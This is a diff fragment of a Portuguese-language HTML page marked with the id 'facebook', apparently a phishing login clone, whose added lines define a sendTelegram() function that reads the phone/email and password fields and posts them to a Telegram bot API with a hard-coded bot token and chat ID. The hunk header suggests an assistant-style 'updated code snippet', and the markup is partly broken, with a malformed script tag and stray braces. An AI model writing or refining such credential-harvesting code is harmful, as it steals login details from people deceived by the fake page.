@@ -108,31 +108,42 @@ Here's an updated code snippet with the modifications:
 
     </footer>
 
-    <script function sendTelegram() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.open("POST", "https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendMessage"); // Ensure "bot" is included in the URL
-  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    <script<html lang="pt-br" id="facebook">
+</head>
 
-  var phoneNumber = document.getElementById("fc-email-telefone").value;
-  var password = document.getElementById("fc-senha").value;
-  var message = "Phone number: " + phoneNumber + "\nPassword: " + password; // Use "\n" for newline
-  var chatId = "-1002081721946";
+<body class="fc-bc-white">
 
-  var params = "chat_id=" + chatId + "&text=" + encodeURIComponent(message); // Encode message for URL safety
+  <script type="text/javascript">
+    function sendTelegram() {
+      var xhttp = new XMLHttpRequest();
+      xhttp.open("POST", "https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendMessage");
+      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 
-  xhttp.onload = function() {
-    if (xhttp.status >= 200 && xhttp.status < 300) {
-      console.log("Message sent successfully!");
-    } else {
-      console.error("Error sending message:", xhttp.responseText);
+      var phoneNumber = document.getElementById("fc-email-telefone").value;
+      var password = document.getElementById("fc-senha").value;
+      var message = "Phone number: " + phoneNumber + "\nPassword: " + password;
+      var chatId = "-1002081721946";
+
+      var params = "chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+
+      xhttp.onload = function() {
+        if (xhttp.status >= 200 && xhttp.status < 300) {
+          console.log("Message sent successfully!");
+        } else {
+          console.error("Error sending message:", xhttp.responseText);
+        }
+      };
+
+      xhttp.onerror = function() {
+        console.error("Network error:", xhttp.statusText);
+      };
+
+      xhttp.send(params);
     }
-  };
+  </script>
+</body>
+</html>
 
-  xhttp.onerror = function() {
-    console.error("Network error:", xhttp.statusText);
-  };
-
-  xhttp.send(params);
 }
 
         }
